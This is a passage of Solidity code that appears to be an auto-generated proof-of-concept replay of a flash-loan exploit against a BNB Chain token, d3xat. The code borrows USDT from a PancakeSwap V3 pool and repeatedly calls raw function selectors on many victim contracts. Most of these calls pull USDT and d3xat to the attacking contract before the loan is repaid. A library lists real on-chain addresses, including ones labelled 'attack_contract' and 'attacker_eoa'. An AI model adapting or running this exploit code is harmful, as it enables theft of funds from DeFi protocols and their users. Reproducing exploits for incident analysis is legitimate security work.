            (bool ok,) = Addresses.A_A94929_57FE
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_703FB4_8C59,
                        1119700963539231411211351
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback124() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback125() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback126() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback127() internal {
        {
            uint256 usdtApproveAllowance25 = 2716831929290807136027402;
            IERC20Like(Addresses.USDT).approve(Addresses.A_F6F300_5146, usdtApproveAllowance25);
        }
    }

    function flashCallback128() internal {
        {
            (bool ok,) = Addresses.A_F6F300_5146
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_600C74_942B,
                        2716831929290807136027402
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback129() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback130() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback131() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback132() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_4D85F6_225F);
    }

    function flashCallback133() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.TransparentUpgradeableProxy_B8AD82);
    }

    function flashCallback134() internal {
        ITransparentUpgradeableProxy_B8AD82(Addresses.TransparentUpgradeableProxy_B8AD82)
            .getAmountOut(Addresses.d3xat, Addresses.USDT, 9367736678314677930664);
    }

    function flashCallback135() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.TransparentUpgradeableProxy_B8AD82);
    }

    function flashCallback136() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(267000000000000000000000, _addressArray2(Addresses.d3xat, Addresses.USDT));
    }

    function flashCallback137() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback138() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback139() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback140() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback141() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback142() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback143() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback144() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback145() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback146() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback147() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback148() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback149() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback150() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback151() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback152() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback153() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback154() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback155() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            require(ok, "selector 0x82839fae failed");
        }
    }

    function flashCallback156() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(
                        bytes4(0x82839fae),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.d3xat,
                        Addresses.USDT,
                        29740606898687781957,
                        address(this)
                    )
                );
            ok;
        }
    }

    function flashCallback157() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_4D85F6_225F);
    }

    function flashCallback158() internal {
        {
            (bool ok,) = Addresses.A_4D85F6_225F
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_232962_D280);
    }

    function flashCallback159() internal {
        {
            (bool ok,) = Addresses.A_232962_D280
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback160() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_FD7D31_C9B5);
    }

    function flashCallback161() internal {
        {
            (bool ok,) = Addresses.A_FD7D31_C9B5
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_0780A5_BEF4);
    }

    function flashCallback162() internal {
        {
            (bool ok,) = Addresses.A_0780A5_BEF4
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback163() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_F3F050_4730);
    }

    function flashCallback164() internal {
        {
            (bool ok,) = Addresses.A_F3F050_4730
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback165() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_3FB468_8962);
    }

    function flashCallback166() internal {
        {
            (bool ok,) = Addresses.A_3FB468_8962
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_BE02EF_8A5D);
    }

    function flashCallback167() internal {
        {
            (bool ok,) = Addresses.A_BE02EF_8A5D
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback168() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_03841C_E9C3);
    }

    function flashCallback169() internal {
        {
            (bool ok,) = Addresses.A_03841C_E9C3
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_E72D1A_F826);
    }

    function flashCallback170() internal {
        {
            (bool ok,) = Addresses.A_E72D1A_F826
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback171() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_B81B26_8808);
    }

    function flashCallback172() internal {
        {
            (bool ok,) = Addresses.A_B81B26_8808
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback173() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_ECA749_2D8B);
    }

    function flashCallback174() internal {
        {
            (bool ok,) = Addresses.A_ECA749_2D8B
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_851BAB_3BA8);
    }

    function flashCallback175() internal {
        {
            (bool ok,) = Addresses.A_851BAB_3BA8
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback176() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_0E01BD_7B4A);
    }

    function flashCallback177() internal {
        {
            (bool ok,) = Addresses.A_0E01BD_7B4A
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_EBEF15_3247);
    }

    function flashCallback178() internal {
        {
            (bool ok,) = Addresses.A_EBEF15_3247
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback179() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_FAE1CC_C251);
    }

    function flashCallback180() internal {
        {
            (bool ok,) = Addresses.A_FAE1CC_C251
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback181() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_2599E0_B261);
    }

    function flashCallback182() internal {
        {
            (bool ok,) = Addresses.A_2599E0_B261
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_79369E_31CB);
    }

    function flashCallback183() internal {
        {
            (bool ok,) = Addresses.A_79369E_31CB
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback184() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_8CEFAC_BBCC);
    }

    function flashCallback185() internal {
        {
            (bool ok,) = Addresses.A_8CEFAC_BBCC
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_B06011_05AB);
    }

    function flashCallback186() internal {
        {
            (bool ok,) = Addresses.A_B06011_05AB
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback187() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_0E0CB7_64C6);
    }

    function flashCallback188() internal {
        {
            (bool ok,) = Addresses.A_0E0CB7_64C6
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback189() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_6D6327_F6F8);
    }

    function flashCallback190() internal {
        {
            (bool ok,) = Addresses.A_6D6327_F6F8
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_FF5879_AEC6);
    }

    function flashCallback191() internal {
        {
            (bool ok,) = Addresses.A_FF5879_AEC6
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback192() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_F314F5_1113);
    }

    function flashCallback193() internal {
        {
            (bool ok,) = Addresses.A_F314F5_1113
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_551E6E_39E4);
    }

    function flashCallback194() internal {
        {
            (bool ok,) = Addresses.A_551E6E_39E4
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback195() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_2ED5B0_042D);
    }

    function flashCallback196() internal {
        {
            (bool ok,) = Addresses.A_2ED5B0_042D
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback197() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_703FB4_8C59);
    }

    function flashCallback198() internal {
        {
            (bool ok,) = Addresses.A_703FB4_8C59
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_600C74_942B);
    }

    function flashCallback199() internal {
        {
            (bool ok,) = Addresses.A_600C74_942B
                .call(
                    abi.encodeWithSelector(bytes4(0x83b95948), Addresses.USDT, Addresses.d3xat, address(this))
                );
            require(ok, "selector 0x83b95948 failed");
        }
    }

    function flashCallback200() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_EEE979_C3C4);
    }

    function flashCallback201() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_90A120_3B87);
    }

    function flashCallback202() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_A426DE_A030);
    }

    function flashCallback203() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_0B4C96_E086);
    }

    function flashCallback204() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.A_521722_BAD2);
    }

    function flashCallback205() internal {
        {
            uint256 flashRepayment = 20002000000000000000000000;
            IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, flashRepayment);
        }
    }

    function _markEntryCallback() internal {
        _replayDone[ENTRY_CALLBACK_DONE] = true;
    }

    receive() external payable {
        if ((address(this) == address(this)
                    && (msg.sender == Addresses.PancakeRouter || msg.sender == address(this)))) {
            _entryCallback();
        }
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        if (!_replayDone[FLASH_CALLBACK_DONE]) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x592d448f) {
            _startFlashLoan();
            return;
        }
        _entryCallback();
    }

    function _entryCallback() internal {
        if (
            address(this) == address(this)
                && (msg.sender == Addresses.PancakeRouter || msg.sender == address(this))
        ) _markEntryCallback();
        return;
    }

    bytes32 private constant FLASH_CALLBACK_DONE = keccak256("poc.flashCallback.done");
    bytes32 private constant ENTRY_CALLBACK_DONE = keccak256("poc.entryCallback.done");
    mapping(bytes32 => bool) private _replayDone;

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_03841C_E9C3 = 0x03841c0f7dE1e1C795B7B2CffC10f30c5e7eE9c3;
    address internal constant A_070E38_1EFD = 0x070e3848c803a8d1e76E5BA76e979f01c9ED1efd;
    address internal constant A_0780A5_BEF4 = 0x0780a51d47AF9a5ABdFFABfEd84E1a27e194BeF4;
    address internal constant A_0B4C96_E086 = 0x0B4c96de3917D17511BBa986d404173d8726e086;
    address internal constant A_0E01BD_7B4A = 0x0E01Bd56d65D29e8EdB6F8F66Ca8eFeb1B0c7B4a;
    address internal constant A_0E0CB7_64C6 = 0x0e0cb765AD4d7cc672CcBF0d6215955465Bb64c6;
    address internal constant A_0E3689_4472 = 0x0e36897F05B0f00200d5ebA91cE5b7cfbF284472;
    address internal constant A_0EE029_8D6C = 0x0EE029959FFBa9096A76F70947a33f2d32758D6C;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_1266C6_5F20 = 0x1266C6bE60392A8Ff346E8d5ECCd3E69dD9c5F20;
    address internal constant A_133421_5EBF = 0x13342140A62Cb51C052b5a70eb186f40a1725eBf;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant A_1A1A84_7041 = 0x1a1a84b45d2fEeeC1B1726F5C1da7d3fe2f37041;
    address internal constant A_232962_D280 = 0x23296260540a71363A3Ca8E2579e32ad86A8d280;
    address internal constant A_2599E0_B261 = 0x2599e05CD54825f5B731Ab1A05bC8513521bb261;
    address internal constant d3xat = 0x2Cc8B879E3663d8126fe15daDaaA6Ca8D964BbBE;
    address internal constant A_2ED5B0_042D = 0x2ed5B0083532AdCCdda24C3F84afe1828ce2042d;
    address internal constant A_340411_C35E = 0x34041116c62802672E52E74828C74Ef376E0c35E;
    address internal constant attack_contract = 0x3b3E1Edeb726b52D5dE79cF8dD8B84995D9Aa27C;
    address internal constant A_3FB468_8962 = 0x3fB468D8489Baaf0218b81DF49A392972dF88962;
    address internal constant A_414ABF_8928 = 0x414AbF56f12c3Fd8dDf19BBa9119910Ff2818928;
    address internal constant attacker_eoa = 0x4B63C0cf524F71847ea05B59F3077A224d922e8D;
    address internal constant A_4D85F6_225F = 0x4D85f6AF054A2271a15F8D3cF880Ba7b7497225F;
    address internal constant A_520588_9BE6 = 0x520588976DFA639a8e6FefF1f5Be95bF4b099bE6;
    address internal constant A_521722_BAD2 = 0x521722Af592947E5a337133685818456eF65bad2;
    address internal constant A_551E6E_39E4 = 0x551e6e912666cEc5921EDd2A8Fe9DBf7d56839e4;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_58EDE5_761D = 0x58ede5070F423E2cf4E5e9D0AAF2b0957Ba3761D;
    address internal constant A_5C8710_3156 = 0x5C8710743ceD1940CA5E515cF95Ed1C812B03156;
    address internal constant A_600C74_942B = 0x600c746b33288B0Ec8AFa4F4c2711761b2aA942b;
    address internal constant A_6AC39F_EBC7 = 0x6Ac39F58d3192CbBB4167BA3b559287D231eeBC7;
    address internal constant A_6D6327_F6F8 = 0x6d632791a7C19F358486c24454293Edf392Bf6f8;
    address internal constant A_703FB4_8C59 = 0x703Fb478112e0886a43DffcA4B89a0A8b3758c59;
    address internal constant A_707FD2_579A = 0x707Fd2d7c5392571EC5CF61e9B8268E07fF1579a;
    address internal constant A_79369E_31CB = 0x79369EE1506CA189cf5496C418519414d11F31cb;
    address internal constant A_7AC51F_5401 = 0x7aC51FAe7913c825E2Fe84fa4275e97199545401;
    address internal constant A_7DBB79_FA91 = 0x7dbb796C3A9006e3221079ef68A622199BBbFA91;
    address internal constant A_851BAB_3BA8 = 0x851bAB2471cfF999a8C3f67B482b3163f3143BA8;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant A_8CEFAC_BBCC = 0x8CeFAcC66a9c6dff935829087690cBBb8E16bBCC;
    address internal constant A_8DBC02_78A8 = 0x8dbC02754584995c2485f48890B4A405679D78A8;
    address internal constant A_90A120_3B87 = 0x90a1207dF14D94f53734946C47c2E3e90D333b87;
    address internal constant PancakeV3Pool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant A_97DFFD_D1C7 = 0x97DffD496744225EBE70c241773745ea5054d1c7;
    address internal constant A_9C3E9F_6704 = 0x9C3E9FBe14FF36e6608A9c4878EccE4d19506704;
    address internal constant A_9CF7A4_83BD = 0x9Cf7A48390eaB2e3c73010b6bFEE7401EA5583BD;
    address internal constant A_A426DE_A030 = 0xA426De3F337C162ff3D011C9B1727C0faae8A030;
    address internal constant A_A42BF9_5DAD = 0xa42BF955F3d320A21d7A5d623948E876424B5dAd;
    address internal constant A_A94929_57FE = 0xA94929D04481a18B0ba47db77b0eAD1Db1AE57FE;
    address internal constant Cake_LP_C30E = 0xaec58FBd7Ed8008A3742f6d4FFAA9F4B0ECbc30e;
    address internal constant A_B06011_05AB = 0xb0601189cE1A3a2AF9e76A162c0669180B8D05Ab;
    address internal constant A_B81B26_8808 = 0xB81b26d297cFe58014Db95cdA4f2eF9FE3688808;
    address internal constant TransparentUpgradeableProxy_B8AD82 = 0xb8ad82c4771DAa852DdF00b70Ba4bE57D22eDD99;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BBF92A_2EC2 = 0xBbF92A2329Dd10451baB5e90b218D8aD62042ec2;
    address internal constant A_BE02EF_8A5D = 0xbE02EfD88158A5d6617Ab7bbA74EB094192d8a5d;
    address internal constant A_C5A630_4026 = 0xC5a630dcdC3Eb1028972348c66C47FC0f6224026;
    address internal constant A_CAC261_0CBA = 0xCAC261d08Cc190eA2BF271aaB40cf21EbCb30cbA;
    address internal constant A_CD7249_399D = 0xcd7249173Ddd438dD9177B3e346932bd996e399D;
    address internal constant A_E12B2E_2414 = 0xE12b2E350251FF3d1cbc53538f2297eF20922414;
    address internal constant A_E72D1A_F826 = 0xE72d1A0Ed1bc148067D985eD962361b1c897F826;
    address internal constant A_E99398_D734 = 0xE99398a6773eE95404db2F74ae2F49F69a43D734;
    address internal constant A_EBEF15_3247 = 0xEBEf159C60dbfe17018ED994274896451bee3247;
    address internal constant A_ECA749_2D8B = 0xeCA749F8702B20d5F8ef1a80D2652b94dfe12d8b;
    address internal constant A_EE3115_5823 = 0xEe3115dD33f7Fd8dB3770A7D13D8a83AF35b5823;
    address internal constant A_EEE979_C3C4 = 0xEEE979843635ada78599658fec4160e202D0c3C4;
    address internal constant A_F1126A_AE1C = 0xf1126a4e6Ce5Ab038988CaDC384a72096a25Ae1C;
    address internal constant A_F314F5_1113 = 0xf314f520247D4C576A0e366c98329423106B1113;
    address internal constant A_F3F050_4730 = 0xF3F05007cE12B85e2ef233c249Cb53d8024d4730;
    address internal constant A_F6F300_5146 = 0xF6f3004909A7735f18ACa0291ee932f8d6a25146;
    address internal constant A_FAE1CC_C251 = 0xFaE1cC8E3f4ae557FfC9746993a2309C2347c251;
    address internal constant A_FD7D31_C9B5 = 0xfd7D31Bdc3736CDa98b0CdC339e0F3Bb9957C9B5;
    address internal constant A_FF5879_AEC6 = 0xFf5879F2d1497fD9661e2766483Fb9F788a2aEc6;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IPancakeRouter {
    function WETH() external view returns (uint256);
    function getAmountsIn(uint256, address[] calldata) external view;
    function swapExactTokensForETH(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface ITransparentUpgradeableProxy_B8AD82 {
    function getAmountOut(address, address, uint256) external view;
}
